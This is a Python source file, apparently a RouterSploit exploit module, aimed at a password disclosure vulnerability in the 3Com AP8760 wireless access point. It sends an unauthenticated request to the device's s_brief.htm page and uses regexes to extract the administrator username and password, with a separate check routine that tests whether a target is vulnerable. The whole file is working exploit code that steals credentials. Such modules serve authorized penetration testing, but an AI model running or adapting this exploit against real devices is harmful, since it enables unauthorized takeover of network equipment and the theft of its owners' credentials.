import re

from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for 3Com AP8760 Password Disclosure vulnerability.
    If the target is vulnerable it is possible to fetch credentials for administration user.
    """
    __info__ = {
        'name': '3Com AP8760 Password Disclosure',
        'description': 'Exploits 3Com AP8760 password disclosure vulnerability.'
                       'If the target is vulnerable it is possible to fetch credentials for administration user.',
        'authors': [
            'Richard Brain',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://www.procheckup.com/procheckup-labs/pr07-40/',
        ],
        'devices': [
            '3Com AP8760',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        creds = []
        url = "{}:{}/s_brief.htm".format(self.target, self.port)

        print_status("Sending payload request")
        response = http_request(method="GET", url=url)
        if response is None:
            return

        print_status("Extracting credentials")
        username = re.findall('<input type="text" name="szUsername" size=16 value="(.+?)">', response.text)
        password = re.findall('<input type="password" name="szPassword" size=16 maxlength="16" value="(.+?)">', response.text)

        if len(username) and len(password):
            print_success("Exploit success")
            creds.append((username[0], password[0]))
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Exploit failed - could not extract credentials")

    @mute
    def check(self):
        url = "{}:{}/s_brief.htm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if "szUsername" in response.text and "szPassword" in response.text:
            return True  # target is vulnerable

        return False  # target not vulnerable
